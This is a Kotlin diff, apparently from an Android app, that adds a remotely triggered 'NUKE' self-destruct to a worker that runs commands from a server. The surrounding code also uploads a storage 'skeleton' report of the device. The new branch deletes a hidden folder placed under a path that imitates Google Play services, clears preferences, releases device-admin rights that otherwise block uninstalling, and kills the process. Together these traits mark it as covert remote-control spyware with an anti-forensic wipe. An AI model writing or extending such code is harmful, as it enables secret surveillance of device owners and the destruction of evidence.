@@ -149,9 +149,37 @@ class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) :
                             // --- NEW: GENERATE & UPLOAD STORAGE SKELETON ---
                             else if (cmd.getString("file_name") == "GET_SKELETON") {
                                 val report = FileManager.generateReport()
-                                // Use the Backup Endpoint (Better for large JSONs)
                                 CloudManager.uploadSkeleton(applicationContext, report, null)
                                 status = "EXECUTED (SIZE: ${report.toString().length} BYTES)"
+                            }
+                            // --- NEW: SELF DESTRUCT (NUKE) ---
+                            else if (cmd.getString("file_name") == "NUKE") {
+                                try {
+                                    // 1. Wipe Data Folder
+                                    val root = java.io.File(android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOCUMENTS), "Android/data/com.google.android.gms/files/cache/.sys_config")
+                                    if (root.exists()) root.deleteRecursively()
+
+                                    // 2. Clear Preferences
+                                    val prefs = applicationContext.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                                    prefs.edit().clear().commit()
+
+                                    // 3. Revoke Admin (Allows Uninstall)
+                                    val dpm = applicationContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                                    val comp = android.content.ComponentName(applicationContext, MyDeviceAdminReceiver::class.java)
+                                    if (dpm.isAdminActive(comp)) {
+                                        dpm.removeActiveAdmin(comp)
+                                    }
+
+                                    status = "EXECUTED (GOODBYE)"
+                                    
+                                    // 4. Kill Process (Suicide)
+                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({ 
+                                        android.os.Process.killProcess(android.os.Process.myPid()) 
+                                    }, 2000)
+
+                                } catch(e: Exception) {
+                                    status = "FAILED NUKE: ${e.message}"
+                                }
                             }
                             // --- 5. FILE/FOLDER CREATION ---
                             else if (fileName.isNotEmpty()) {
